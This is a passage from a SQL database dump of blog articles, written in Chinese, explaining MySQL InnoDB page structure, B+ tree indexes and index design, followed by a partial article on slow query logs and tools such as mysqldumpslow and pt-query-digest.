INSERT INTO `article` VALUES (110, 1, 'mysql的数据页搜索结构与索引', '2018/8/1535357820_c8f0dd6681772b11a498172b260d1ea8.jpg', '### 数据页的搜索结构\n#### 数据页在磁盘中的存储结构\n![Mysql数据页在磁盘中的存储结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625901648_Mysql-数据页在磁盘中的存储结构.png)\n```java\n大量的数据页是按顺序一页一页存放的，然后两两相邻的数据页之间会采用双向链表的格式互相引用。\n一个数据页在磁盘文件里就是一段数据，可能是二进制或者别的特殊格式的数据。\n数据页里包含两个指针，一个指针指向自己上一个数据页的物理地址，一个指针指向自己下一个数据页的物理地址。\n每个数据页，都有一个指针指向自己上一个数据页在磁盘文件里的起始物理位置。\n比如linked_list_pre_pointer=15367，就是指向了上一个数据页在磁盘文件里的起始物理位置，那个15367可以认为就是在磁盘文件里的position或者offset。\n同理，也有一个指针指向自己下一个数据页的物理位置。\n\n一个数据页内部会存储一行一行的数据，也就是平时我们在一个表里插入的一行一行的数据就会存储在数据页里。\n数据页里的每一行数据都会按照主键大小进行排序存储，同时每一行数据都有指针指向下一行数据的位置，组成单向链表。\n\n```\n#### 数据页的页分裂\n![Mysql页分裂.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625902196_Mysql-页分裂.png)\n```java\n在一个表里不停的插入数据的时候，会涉及到一个页分裂的过程\n正常情况下在一个表里插入一些数据后，都会进入到一个数据页里去，在数据页内部，数据会组成一个单向链表，这个数据页内部的单向链表。\n\n行数据的类型,0代表的是普通类型，1代表的是B+树非叶子节点，2代表的是最小值数据，3代表的是最大值数据\n数据页里面就是一行一行的数据，刚开始第一行是个起始行，他的行类型是2，就是最小的一行。\n起始行有一个指针指向了下一行数据，每一行数据都有自己每个字段的值，然后每一行通过一个指针不停的指向下一行数据，普通的数据行的类型都是0\n最后一行是一个类型为3的，就是代表最大的一行。\n\n假设不停的在表里插入数据，刚开始会不停的在一个数据页插入数据,接着数据越来越多，越来越多，此时就要再搞一个数据页了。\n但是有时主键并不是自增长的，所以可能会出现在后一个数据页的主键值里，有的主键是小于前一个数据页的主键值的。\n比如在第一个数据页里有一条数据的主键是10，第二个数据页里居然有一条数据的主键值是8，那此时肯定有问题了。\n所以此时就会出现一个过程，叫做\"页分裂\"。\n在增加一个新的数据页的时候，实际上会把前一个数据页里主键值较大的，挪动到新的数据页里来。\n然后把新插入的主键值较小的数据挪动到上一个数据页里去，保证新数据页里的主键值一定都比上一个数据页里的主键值大。\n如图,第一个数据页里有1、5、6三条数据，第二个数据页里有2、3、4三条数据，明显第二个数据页里的数据的主键值比第一个数据页里的5和6两个主键都小，所以这个是不行的。\n此时就会出现页分裂的行为，把新数据页里的两条数据挪动到上一个数据页，上一个数据页里挪两条数据到新数据页里去。\n页分裂的核心目标就是保证下一个数据页里的主键值都比上一个数据页里的主键值要大。\n```\n#### 数据页的页目录\n![Mysql数据页的页目录.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625901649_Mysql-数据页的页目录.png)\n```java\n每个数据页里都会有一个页目录\n页目录里面根据每一组数据行组合。主键对应的是这一组数据行里面的最小值。\n数据行是被分散存储到不同的槽位里去的，所以实际上每个数据页的目录里，就是这个页里每个主键跟所在槽位的映射关系。\n每一个槽对应一个分组的，一个分组里有多个行 先二分定位槽，然后在内部遍历组里的数据行,获取到对应的数据行的数据。\n\n假设要根据主键查找一条数据，而且假设此时你数据库里那个表就没几条数据，那个表总共就一个数据页。\n首先就会先到数据页的页目录里根据主键进行二分查找\n通过二分查找在目录里迅速定位到主键对应的数据是在哪个槽位里，然后到那个槽位里去，遍历槽位里每一行数据,这样就能快速找到那个主键对应的数据了。\n每个槽位里都有一组数据行，在里面遍历查找就可以了。\n\n// 非主键的字段扫描\n假设要是根据非主键的其他字段查找数据\n此时是没办法使用主键的那种页目录来二分查找的，只能进入到数据页里，根据单向链表依次遍历查找数据了，这就性能很差了。\n一个表里往往都是有大量数据的，可能有多达成百上千个数据页，这些数据页就存放在物理磁盘文件里。\n// 全表扫描\n假设没有建立任何索引，那么无论是根据主键查询，还是根据其他字段来条件查询，实际上都没有什么取巧的办法\n一个表里所有数据页都是组成双向链表,直接从第一个数据页开始遍历所有数据页，从第一个数据页开始，得先把第一个数据页从磁盘上读取到内存buffer pool的缓存页里来。\n然后在第一个数据页对应的缓存页里，按照上述办法查找，假设是根据主键查找的，可以在数据页的页目录里二分查找。\n假设根据其他字段查找的，只能是根据数据页内部的单向链表来遍历查找。\n其实上述操作过程，就是全表扫描，在没有任何索引数据结构的时候,就是根据双向链表依次把磁盘上的数据页加载到缓存页里去，然后在一个缓存页内部来查找那条数据。\n最坏的情况下，得把所有数据页里的每条数据都得遍历一遍，才能找到需要的那条数据，这就是全表扫描\n```\n#### 主键目录 \n![Mysql主键目录.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625902971_Mysql-主键目录.png)\n```java\n假设我们有多个数据页，然后想要根据主键来查询数据。\n直接查询的话是不行的，因为我们也不知道主键到底是在哪里。\n假设要搜id=4的数据，怎么知道在哪个数据页里。\n这样的话,就只能全表扫描了，从第一个数据页开始，每个数据页都进入到页目录里查找主键，最坏情况下，所有数据页都得扫描一遍。\n所以此时就需要针对主键设计一个索引了，针对主键的索引实际上就是主键目录。\n主键目录就是把每个数据页的页号，还有数据页里最小的主键值放在一起，组成一个索引的目录\n有主键目录就方便了，直接就可以到主键目录里去搜索。\n比如要找id=3的数据，此时就会跟每个数据页的最小主键来比，首先id=3大于了数据页2里的最小主键值1，小于了数据页8里的最小主键值9。\n所以直接就可以定位到id=3的数据一定是在数据页2里的\n\n只要在一个主键索引里包含每个数据页跟他行数据中最小主键值，就可以组成一个索引目录。\n然后后续查询主键值，就可以在索引目录里二分查找直接定位到那条数据所属的数据页，接着到数据页里的页目录二分查找定位那条数据就可以了。\n这个效率是非常之高的，主键目录就可以认为是主键索引,也可以称为是索引页。\n\n```\n### B+树索引\n#### B+树如何实现索引\n![MysqlB加树实现索引.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625903878_Mysql-B加树实现索引.png)\n```java\n表里的数据可能很多很多，比如有几百万，几千万，甚至单表几亿条数据都是有可能的。\n所以可能有大量的数据页，主键目录里就要存储大量的数据页和最小主键值,这怎么行。\n表的实际数据是存放在数据页里的，表的索引其实也是存放在页里的。\n索引放在页里之后，就会有索引页，假设你有很多很多的数据页，那么此时你就可以有很多的索引页。\n\n如果有很多索引页，但是此时需要知道应该到哪个索引页里去找主键数据，是索引页20？还是索引页28？\n于是接下来又可以把索引页多加一个层级出来，在更高的索引层级里，保存了每个索引页和索引页里的最小主键值。\n现在就好了，假设我们要查找id=46的，直接先到最顶层的索引页35里去找，直接通过二分查找可以定位到下一步应该到索引页20里去找。\n接下来到索引页20里通过二分查找定位，也很快可以定位到数据应该在数据页8里，再进入数据页8里，就可以找到id=46的那行数据了。\n\n假如最顶层的那个索引页里存放的下层索引页的页号也太多了，此时可以再次分裂，再加一层索引页。\n索引页不知不觉中组成了多个层级，是不是有点像一棵树？\n这就是一颗B+树,属于数据结构里的一种树形数据结构，所以一直说MySQL的索引是用B+树来组成的，其实就是这个意思。\n\n以最简单最基础的主键索引来举例，当你为一个表的主键建立起来索引之后，其实这个主键的索引就是一颗B+树。\n当你要根据主键来查数据的时候，直接就是从B+树的顶层开始二分查找，一层一层往下定位，最终一直定位到一个数据页里，在数据页内部的目录里二分查找，找到那条数据。\n\n这就是索引最真实的物理存储结构，采用跟数据页一样的页结构来存储，一个索引就是很多页组成的一颗B+树。\n\n```\n#### B+树聚簇索引\n![MysqlB加树聚簇索引.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625904914_Mysql-B加树聚簇索引.png)\n```java\n其实最下层的索引页，都是会有指针引用数据页的，所以实际上索引页之间跟数据页之间是有指针连接起来的。\n索引页自己内部，对于一个层级内的索引页，互相之间都是基于指针组成双向链表的。\n假设你把索引页和数据页综合起来看，他们都是连接在一起的，看起来就如同一颗完整的大的B+树一样，从根索引页88开始，一直到所有的数据页，其实组成了一颗巨大的B+树。\n\n在这颗B+树里，最底层的一层就是数据页，数据页也就是B+树里的叶子节点了\n如果一颗大的B+树索引数据结构里，叶子节点就是数据页自己本身，那么此时我们就可以称这颗B+树索引为聚簇索引。\n在InnoDB存储引擎里，在对数据增删改的时候，就是直接把数据页放在聚簇索引里的，数据就在聚簇索引里。\n\n如果你的数据页开始进行页分裂了，此时会调整各个数据页内部的行数据，保证数据页内的主键值都是有顺序的，下一个数据页的所有主键值大于上一个数据页的所有主键值。 \n同时在页分裂的时候，会维护你的上层索引数据结构，在上层索引页里维护你的索引条目，不同的数据页和最小主键值。\n如果你的数据页越来越多，一个索引页放不下了，此时就会再拉出新的索引页，同时再搞一个上层的索引页，上层索引页里存放的索引条目就是下层索引页页号和最下主键值。\n按照这个顺序，以此类推，如果你的数据量越大，此时可能就会多出更多的索引页层级来。\n这个聚簇索引默认是按照主键来组织的，所以在增删改数据的时候，一方面会更新数据页，一方面其实会给你自动维护B+树结构的聚簇索引，给新增和更新索引页，这个聚簇索引是默认就会给你建立的。\n```\n#### 二级索引\n```java\n基于主键的数据搜索,其实就是从聚簇索引的根节点开始进行二分查找，一路找到对应的数据页里，基于页目录就直接定位到主键对应的数据就可以了。\n但如果想要对其他的字段建立索引，甚至是基于多个字段建立联合索引，此时这个索引结构又是如何的呢\n假设要是针对其他字段建立索引，比如name、age之类的字段，这都是一样的原理。\n简单来说，比如插入数据的时候，一方面会把完整数据插入到聚簇索引的叶子节点的数据页里去，同时维护好聚簇索引，另一方面会为其他字段建立的索引，重新再建立一颗B+树。\n\n比如基于name字段建立了一个索引，那么此时你插入数据的时候，就会重新搞一颗B+树。\nB+树的叶子节点也是数据页，但是这个数据页里仅仅放主键字段和name字段。\n注意，这可是独立于聚簇索引之外的另外一个索引B+树了。\n严格来说是name字段的索引B+树，所以在name字段的索引B+树里，叶子节点的数据页里仅仅放主键和name字段的值。\n\n至于排序规则之类的，都是跟以前说的一样的,也就是说，name字段的索引B+树里，叶子节点的数据页中的name值都是按大小排序的，同时下一个数据页里的name字段值都大于上一个数据页里的name字段值，这个整体的排序规则都跟聚簇索引按照主键的排序规则是一样的。\nname字段的索引B+树也会构建多层级的索引页，这个索引页里存放的就是下一层的页号和最小name字段值，整体规则都是一样的，只不过存放的都是name字段的值，根据name字段值排序。\n所以假设你要根据name字段来搜索数据，搜索过程和聚簇索引一样，就是从name字段的索引B+树里的根节点开始找，一层一层往下找，一直找到叶子节点的数据页里，定位到name字段值对应的主键值。\n此时针对select * from table where name=\'xx\'这样的语句，你先根据name字段值在name字段的索引B+树里找，找到叶子节点也仅仅可以找到对应的主键值，而找不到这行数据完整的所有字段。\n所以此时还需要进行\"回表\"，这个回表，就是说还需要根据主键值，再到聚簇索引里从根节点开始，一路找到叶子节点的数据页，定位到主键对应的完整数据行，此时才能把select *要的全部字段值都拿出来。\n\n其实也可以把多个字段联合起来，建立联合索引，比如name+age\n联合索引的运行原理也是一样的，只不过是建立一颗独立的B+树，叶子节点的数据页里放了id+name+age，然后默认按照name排序，name一样就按照age排序，不同数据页之间的name+age值的排序也如此。\n然后这个name+age的联合索引的B+树的索引页里，放的就是下层节点的页号和最小的name+age的值，以此类推，所以当你根据name+age搜索的时候，就会走name+age联合索引的这颗B+树了，搜索到主键，再根据主键到聚簇索引里去搜索。\n```\n#### 各种不同的树状数据结构\n```java\n// 平衡二叉树\n二叉树的特点是父节点左子树所有结点的值小于父节点的值，右子树所有结点的值大于父节点的值\n为了维持查询复杂度,需要保持这棵树是平衡二叉树\n平衡二叉查找树,又称AVL树.它除了具备二叉查找树的基本特征,还具备一个非常重要的特点: 它的左子树和右子树都是平衡二叉树,且左子树和右子树的深度之差的绝对值(平衡因子)不超过1,也就是说AVL树每个节点的平衡因子只可能是-1,0,1(左子树高度减去右子树高度)\n优点: 平衡二叉树算法基本与二叉树查询相同,效率比较高\n缺点: 插入操作需要旋转,支持范围查询但效率低(深度太高,对IO性能造成影响)\n一棵100万节点的平衡二叉树,树高20,一次查询可能需要访问 20 个数据块\n对于一个100万行的表，如果使用二叉树来存储，单独访问一个行可能需要20个10ms的时间\n如果是1000万行的表,那么需要2000ms,这个查询速度非常慢\n\n// B树\n树可以有二叉，也可以有多叉，多叉树就是每个节点有多个儿子，儿子之间的大小保证从左到右递增\n为了让一个查询尽量少地读磁盘，就必须让查询过程访问尽量少的数据块。\n所以不应该使用二叉树，而是要使用N 叉树。这里,N 叉树中的 N 取决于数据块的大小\nInnoDB 的一个整数字段索引为例，这个 N 差不多是 1200\n当这棵树高是4的时候，就可以存1200的3次方个值，相当于17亿了\n但这棵树深度低时,那么访问磁盘的次数就少了\nN叉树因为在读写上的性能优点以及适配磁盘的访问模式，已经被广泛应用在数据库引擎中\n\nB树是一种树状数据结构,他能够存储数据,对其进行排序并允许以O(log n)的时间复杂度运行进行查找,顺序读取,插入和删除的数据结构\nB树,概括来说是一个节点可以拥有多于2个节点的二叉查找树,与自平衡二叉查找树不同,B树为系统最大化大块数据的读和写操作,B树算法减少定位记录时所经历的中间过程,从而加快存取速度,普遍运用在数据库和文件系统\n优点: 因为B树节点元素比平衡二叉树要少,所以B树数据结构相比平衡二叉树数据结构实现减少磁盘IO的操作\n缺点: 尽管减少树的深度,也可进行范围查询,但范围查询效率依旧很慢,这是因为数据存储在不同的树节点上,要反复去节点中找\n\n// B+树\nB+树相比B树,新增叶子节点与非叶子节点关系\n叶子节点中包含了key和value,非叶子节点中只是包含key,不包含value\n通过非叶子节点查询到叶子节点再获取对应的value,所有相邻的叶子节点包含非叶子节点,使用链表结合,有一定顺序排序,从而范围查询效率非常高\n优点: 继承B树特征,范围查询因为叶子节点结合的链表使得效率非常高\n缺点: 因为有冗余节点数据,会比较占硬盘大小,但以空间换时间是绝对值得的\nmyisam引擎和innodb引擎都是采用B+树实现,但有略微区别,myisam存放物理地址值,再获取数据页,innodb直接存放数据页\n```\n### 使用索引的注意点\n#### 索引维护\n```java\nB+树为了维护索引有序性，插入新值的时候需要做必要的维护。\n如果插入新的行 ID 值为 700，则只需要在 ID=600 的记录后面插入一个新记录。\n如果新插入的 ID 值为 400，就麻烦了，需要逻辑上挪动后面的数据，空出位置\n// 页分裂\n更糟的情况是如果 ID=600 所在的数据页已经满了\n根据 B+ 树的算法，这时候需要申请一个新的数据页，然后挪动部分数据过去。\n这个过程称为页分裂。在这种情况下，性能自然会受影响。\n除了性能外，页分裂操作还影响数据页的利用率。\n原本放在一个页的数据，现在分到两个页中，整体空间利用率降低大约 50%。\n// 页合并\n当相邻两个页由于删除了数据，利用率很低之后，会将数据页做合并。\n合并的过程，可以认为是分裂过程的逆过程\n\n// 建议递增id作为主键\n自增主键是指自增列上定义的主键，在建表语句中一般是这么定义的： \nNOT NULL PRIMARY KEY AUTO_INCREMENT\n插入新记录的时候可以不指定 ID 的值，系统会获取当前 ID 最大值加 1 作为下一条记录的 ID 值\n自增主键的插入数据模式，正符合了递增插入的场景。每次插入一条新记录，都是追加操作，都不涉及到挪动其他记录，也不会触发叶子节点的分裂\n但有业务逻辑的字段做主键，则往往不容易保证有序插入，所以写数据成本相对较高\n假设你的表中确实有一个唯一字段，比如字符串类型的身份证号，那应该用身份证号做主键，还是用自增字段做主键呢\n如果有身份证号做主键,因为不是有序插入的,所以会导致频繁的页分裂\n除了考虑性能外，我们还可以从存储空间的角度来看\n由于每个非主键索引的叶子节点上都是主键的值。\n如果用身份证号做主键，那么每个二级索引的叶子节点占用约 20 个字节，而如果用整型做主键，则只要 4 个字节，如果是长整型（bigint）则是 8 个字节\n主键长度越小，普通索引的叶子节点就越小，普通索引占用的空间也就越小\n从性能和存储空间方面考量，递增的主键往往是更合理的选择\n\n```\n#### 覆盖索引\n```java\n(1) 在 k 索引树上找到 k=1 的记录，取得 ID = 100\n(2) 再到 ID 索引树查到 ID=100 对应的 数据\n回到主键ID索引树搜索的过程，我们称为回表。\n由于查询结果所需要的数据只在主键索引上有，所以不得不回表。\n所以,我们需要优化,尽量避免回表\n\n// 覆盖索引\n如果执行的语句是 select ID from T where k = 1\n此时只需要查 ID 的值，而 ID 的值已经在 k 索引树上了，因此可以直接提供查询结果，不需要回表。\n也就是说，在这个查询里面，索引 k 已经“覆盖了”我们的查询需求，我们称为\"覆盖索引\"\n\n由于覆盖索引可以减少树的搜索次数，显著提升查询性能，所以使用覆盖索引是一个常用的性能优化手段\n\n// 使用联合索引\n身份证号是市民的唯一标识。如果有根据身份证号查询市民信息的需求，我们只要在身份证号字段上建立索引就够了。\n但如果有一个高频请求，要根据市民的身份证号查询他的姓名，(身份证号+姓名)这个联合索引就有意义了。\n它可以在这个高频请求上用到覆盖索引，不再需要回表查整行记录，减少语句的执行时间,因为身份证号和姓名都在索引树的数据上。\n当然,索引字段的维护总是有代价的。因此，在建立冗余索引来支持覆盖索引时就需要权衡考虑了。\n\n基于非主键索引的查询需要多扫描一棵索引树。\n因此，我们在应用中应该尽量使用主键查询,避免回表,或者建立联合索引,在二级索引中就将查询的字段存放\n使用普通索引时,mysql优化器会把回表的代价算进去,所以有时会估算统计扫描行数错误,选择低效率的索引进行执行甚至全表扫描\nanalyze table t 这个命令,可以让mysql重新统计索引信息\n\n```\n#### 最左前缀原则\n![Mysql最左前缀原则.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625290461_Mysql-最左前缀原则.png)\n```java\n如果为每一种查询的字段都设计一个索引，会导致索引太多了。\n如果还要按照市民的身份证号去查他的家庭地址,虽然这种请求不太常见,但总不能走全盘扫描\n单独为一个不频繁的请求创建一个（身份证号，地址）的索引会很浪费\n这时可以利用B+树这种索引结构的索引的\"最左前缀\"来定位记录。\n\n索引项是按照索引定义里面出现的字段顺序排序的\n当逻辑需求是查到所有名字是\"张三\"的人时，可以快速定位到 ID4，然后向后遍历得到所有需要的结果\n当逻辑需求是查到所有名字第一个字是\"张\"的人，SQL 语句的条件是\"where name like ‘张%’\"。\n此时你也能够用上这个索引，查找到第一个符合条件的记录是 ID3，然后向后遍历，直到不满足条件为止\n只要满足最左前缀，就可以利用索引来加速检索。\n这个最左前缀可以是联合索引的最左 N 个字段，也可以是字符串索引的最左 M 个字符\n\n// 在建立联合索引的时候，如何安排索引内的字段顺序\n评估标准是，索引的复用能力\n因为可以支持最左前缀，所以当已经有了 (a,b) 这个联合索引后，一般就不需要单独在 a 上建立索引了。\n因此，第一原则是，如果通过调整顺序，可以少维护一个索引，那么这个顺序往往就是需要优先考虑采用的\n如果既有联合查询,又有基于 a、b 各自的查询,查询条件里面只有 b 的语句，是无法使用 (a,b) 这个联合索引的\n这时不得不维护另外一个索引，也就是说需要同时维护 (a,b)、(b) 这两个索引\n这时要考虑的原则就是空间了。\n比如name 字段是比 age 字段大的 ，那就建议创建一个（name,age) 的联合索引和一个 (age) 的单字段索引.\n\n// 前缀索引长度\n前缀索引可以定义长度,你可以定义字符串的一部分作为索引。\n默认如果你创建索引的语句不指定前缀长度，那么索引就会包含整个字符串\n比如alter table SUser add index index1(email(6))\nemail(6) 这个索引结构中每个邮箱字段都只取前 6 个字节,所以占用的空间会更小\n但建立索引时关注的是区分度，区分度越高越好,如果长度太小,会导致区分度低,查询成本变高\n使用前缀索引，定义好恰当的长度，可以做到既节省空间，又不用额外增加太多的查询成本\n// 使用前缀索引长度需要回表,无法使用覆盖索引优化\n即使索引树中有完整的数据,InnoDB 还是要回到 id 索引再查一下\n因为系统并不确定前缀索引的定义是否截断了完整信息,这就导致了定义前缀索引长度需要回表,无法使用覆盖索引的优化了\n\n```\n#### 索引下推\n![Mysql索引下推.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625290557_Mysql-索引下推.png)\n```java\n满足最左前缀原则的时候，最左前缀可以用于在索引中定位记录。\n当不符合最左前缀的部分怎么样\n以联合索引（name, age）为例。如果有一个需求：\n检索出表中“名字第一个字是张，而且年龄是 10 岁的所有男孩”。那么SQL 语句是这样的\nmysql> select * from tuser where name like \'张%\' and age=10 and ismale=1;\n当这个语句在搜索索引树的时候，只能用 \"张\"，找到第一个满足条件的记录ID3,然后判断断其他条件是否满足\nMySQL5.6之前版本不会在索引内部判断,每次都需要回表,会回表4次\nMySQL 5.6后 引入索引下推优化（index condition pushdown)\n可以在索引遍历过程中，对索引中包含的字段先做判断，直接过滤掉不满足条件的记录，减少回表次数\n每一个虚线箭头表示回表一次\nInnoDB 在 (name,age) 索引内部就判断了 age 是否等于 10\n对于不等于 10 的记录，直接判断并跳过。\n这样只需要对 ID4、ID5 这两条记录回表取数据判断，就只需要回表 2 次\n\n```\n#### 排序以及分组时使用索引\n```java\n// order by\n当SQL语句里使用order by语句进行排序的时候，如何才能用上索引\n假设有一个select * from table where xxx=xxx order by xxx这样的一个SQL语句.\n似乎应该是基于where语句通过索引快速筛选出来一波数据，接着放到内存里，或者放在一个临时磁盘文件里，然后通过排序算法按照某个字段走一个排序，最后把排序好的数据返回。\n但是这样的速度有点慢，万一要排序的数据量比较大的话,还不能用内存来排序。\n如果基于磁盘文件来排序，那在MySQL里有一个术语，叫做filesort，这速度就比较慢了。\n\n// 多字段排序使用联合索引\n通常而言最好不要这样做，尤其是类似于select * from table order by xx1,xx2,xx3 limit 100这样的SQL语句,按照多个字段进行排序然后返回排名前100条数据。\n在这种情况下，假设建立一个INDEX(xx1,xx2,xx3)这样的一个联合索引。\n这个时候默认情况下在索引树里本身就是依次按照xx1,xx2,xx3三个字段的值去排序的。\n那么此时再运行select * from table order by xx1,xx2,xx3 limit 100这样的SQL语句，就不需要在内存或磁盘里排序了。\n\n// 多字段全部升序或全部降序\n有一些限定规则，因为联合索引里的字段值在索引树里都是从小到大依次排列的。\n所以在order by要不然就都加DESC降序排列,要不然就都加ASC升序排列。\n如果都是升序排列，直接就从索引树里最小的开始读取一定条数就可以了。\n要是都是降序排列，就是从索引树里最大的数据开始读取一定的条数就可以了。\n但是不能order by语句里有的字段升序有的字段降序，那是不能用索引的。\n如果order by语句里有的字段不在联合索引里，或者是对order by语句里的字段用了复杂的函数，这些也不能使用索引去进行排序了。\n\n// group by\n对于group by后的字段，最好也是按照联合索引里的最左侧的字段开始，按顺序排列开来。\ngroup by和order by用上索引的原理和条件都是差不多的。\n本质都是在group by和order by之后的字段顺序和联合索引中的从最左侧开始的字段顺序一致，然后就可以充分利用索引树里已经完成排序的特性，快速的根据排序好的数据执行后续操作。\n\n```\n#### 范围查询的索引放在联合索引最后\n```java\n查询某个省份的某个城市中不限性别的某个年龄段的用户\n一般会把索引设计成（province, city, sex, age)。\n语句写成where province=xx and city=xx and age>=xx and age<=xx\n但这是没法让age用上索引去筛选的，因为city和age中间差了一个sex，所以此时就不符合最左侧连续多个字段的原则了。\n此时可以把where语句写成：\nwhere province=xx and city=xx and sex in (\'female\', \'male\') and age >=xx and age<=xx。\n如果把语句写成上面那样子，那么就可以让整个where语句里的条件全部都在索引树里进行筛选和搜索了。\n\nage字段必须要放在联合索引的最后一个\n因为where语句里有等值匹配，还有范围匹配。\n此时必须是先让联合索引最左侧开始的多个字段使用等值匹配，接着最后一个字段是范围匹配。\n因为在SQL里，一旦一个字段做范围查询用到了索引，那么这个字段接下来的条件都不能用索引了，这是规则。\n\n```\n#### 设计索引考虑的因素\n```java\n// 保证每个SQL语句的where、order by和group by都可以用上索引并保证前缀匹配。\n设计一个或者两三个联合索引,每一个联合索引都尽量去包含上你的where、order by、group by里的字段。\n仔细审查每个SQL语句，是不是每个where、order by、group by后面跟的字段顺序，是不是都是某个联合索引的最左侧字段开始的部分字段\n\n// 选择基数大的字段建立索引\n建立索引尽量使用那些基数比较大的字段，就是值比较多的字段，那么才能发挥出B+树快速二分查找的优势来。\n其次尽量是对那些字段的类型比较小的列来建立索引,，比如说tinyint之类的，因为字段类型比较小，说明这个字段自己本身的值占用磁盘空间小，此时在搜索的时候性能也会比较好一点。\n\n// 适量使用索引\n索引好处显而易见，可以直接根据某个字段的索引B+树来查找数据，不需要全表搜索，性能提升是很高的。\n索引当然有缺点了，主要是两个缺点，一个是空间上的，一个是时间上的。\n在空间上,你要是给很多字段创建很多的索引，那必须会有很多棵索引B+树，每一棵B+树都要占用很多的磁盘空间,要是索引太多了，是很耗费磁盘空间的。\n在时间上,在进行增删改查的时候，每次都需要维护各个索引的数据有序性，因为每个索引B+树都要求页内是按照值大小排序的，页之间也是有序的，下一个页的所有值必须大于上一个页的所有值\n不停的增删改查，必然会导致各个数据页之间的值大小可能会没有顺序，比如下一个数据页里插入了一个比较小的值，居然比上一个数据页的值要小。\n此时只能进行数据页的挪动，维护页之间的顺序。\n不停的插入数据，各个索引的数据页就要不停的分裂，不停的增加新的索引页，这个过程都是耗费时间的。\n如果一个表里的索引太多了，很可能就会导致增删改的速度就比较差了。\n也许查询速度确实是可以提高，但是增删改就会受到影响，因此通常来说，不建议一个表里搞的索引太多的。\n因此设计索引别太多，建议两三个联合索引就应该覆盖掉这个表的全部查询了。\n\n// 主键一定是自增的，别用UUID之类的\n因为主键自增，起码聚簇索引不会频繁的分裂，主键值都是有序的，就会自然的新增一个页而已。\n但是如果用的是UUID之类无序值用作主键，那么会导致聚簇索引频繁的页分裂。\n\n```', 0, 0, 284, 0, 0, '2021-04-14 16:18:45', '2021-04-16 16:18:45', 0, 0);
INSERT INTO `article` VALUES (111, 1, 'mysql的执行计划与慢查询日志', '2021/5/1621067704_mmexport1621057607950.jpg', '### 慢查询\n```java\n// 慢查询\n缓慢的查询,低效的性能导致影响正常业务\nMySQL默认10秒内没有响应SQL结果,为慢查询\n\n// 检查慢查日志是否开启:\nshow variables like \'slow_query_log\';\n// 检查慢日志路径\nshow variables like \'%slow_query_log%\';\n// 开启慢日志\nset global slow_query_log=on;\n// 慢日志判断标准(默认查询时间大于10s的sql语句)\nshow variables like \'long_query_time\';\n// 慢日志测试,检查慢日志记录情况\nselect sleep(12);\n// 显示慢查询次数\nshow status like \'show_queries\'\n// 修改慢日志判断标准,修改为1秒 ---修改为一秒但是重启mysql之后，long_query_time依然是my.ini中的值,永久生效需要修改my.ini\nset global long_query_time=1;\n// 为了测试方便,所有查询都记录进慢日志(生产环境不要打开,否则产生大量无用日志,如建立索引)\nset global log_queries_not_using_indexes=on;\nshow variables like \'%log%\';\n// mysql数据库启动花费多少时间\nshow status like \'uptime\'\n// 显示mysql数据库的连接数\nshow status like \'connections\'\n// 显示数据的查询,更新,添加,删除次数\nshow status like \'com [select|insert|update|delete]\'\n// session是当前窗口的执行次数,global是启动至此的执行次数\nshow [session|global] status like\n// 监听慢日志(慢日志路径注意不同)\ntail -f /var/lib/mysql/izwz9hiye4lft7f85poremz-slow.log\n```\n### 慢查询日志的存储格式\n![lowquerylog.png](http://blog.img.tuwq.cn/upload/artimg/2021/5/1621070662_lowquerylog.png)\n```java\n第一行,SQL查询执行的时间 \n第二行,执行SQL查询的连接信息,用户和连接IP \n第三行,记录了一些我们比较有用的信息,如下解析\n	(1) Query_time,这条SQL执行的时间,越长则越慢\n	(2) Lock_time,在MySQL服务器阶段(不是在存储引擎阶段)等待表锁时间\n	(3) Rows_sent,查询返回的行数\n	(4) Rows_examined,查询检查的行数,越长就当然越费时间\n第四行,设置时间戳,没有实际意义,只是和第一行对应执行时间\n第五行及后面所有行(第二个#Time:之前),执行的sql语句记录信息,因为sql可能会很长\n```\n\n#### mysqlDumpSlow\n![mysqldumpslow.png](http://blog.img.tuwq.cn/upload/artimg/2021/5/1621073111_mysqldumpslow.png)\n```java\n// mysqldumpslow\n// 简介\n如果开启了慢查询日志,就会生产大量的数据,然后我们就可以通过对日志的分析,生产分析报表,通过报表进行优化\n// 用法帮助\n执行mysqldumpslow --help 查看详细用法\n注意 在mysql数据库所在的服务器上 而不是mysql>命令行中\n// 常用命令\n(1) 统计:mysqldumpslow --verbose /var/lib/mysql/izwz9hiye4lft7f85poremz-slow.log\n(2) 时间排序: mysqldumpslow -s c /var/lib/mysql/izwz9hiye4lft7f85poremz-slow.log\n// 优缺点\n这个工具是最常用的工具,通过安装mysql进行附带安装,但是该工具统计的结果比较少,对我们的优化所提供的信息还是比较少,比如cpu,io等信息都没有\n```\n#### pt-query-digest\n![ptquerydigest.png](http://blog.img.tuwq.cn/upload/artimg/2021/5/1621078083_pt-query-digest.png)\n```java\n// 简介\npt-query-digest是用于分析mysql慢查询的一个第三方工具,它可以分析binlog、Generallog、slowlog\n也可以通过SHOWPROCESSLIST或者过tcpdump抓取的mysql协议数据来进行分析。\n可以把分析结果输出到文件中,分析过程中先对查询语句的条件进行参数化,然后对参数化以后的查询进行分组统计,统计出各查询的执行时间、次数、占比等,可以借助分析结果找出问题进行优化\n// 功能\n// (1) pt-query-digest本质是perl脚本,所以首先安装perl模块\nyum install -y perl-CPAN perl-Time-HiRes\n// (2) 快速安装\nwget https://www.percona.com/downloads/percona-toolkit/3.2.0/binary/redhat/7/x86_64/percona-toolkit-3.2.0-1.el7.x86_64.rpm\nyum localinstall -y percona-toolkit-3.2.0-1.el7.x86_64.rpm\n// (3) 检查是否安装完成\npt-query-digest --help\n\n// 常用命令\n(1) 查看服务器信息\npt-summary\n(2) 查看磁盘开销使用信息\npt-diskstats\n\n// mysql相关命令\n// 查看mysql数据库信息\npt-mysql-summary --user=root --password=1234\n// 分析慢查询日志\npt-query-digest --limit 100% /var/lib/mysql/izwz9hiye4lft7f85poremz-slow.log\n// 从库和同步状态\npt-slave-find --host=localhost --user=root --password=1234\n// 如果报错DBI connect(\';host=localhost;mysql_read_default_group=client\',\'root\',...) failed: Authentication plugin \'caching_sha2_password\' cannot be loaded: /usr/lib64/mysql/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory at /usr/bin/pt-slave-find line 2023.\n(1) use 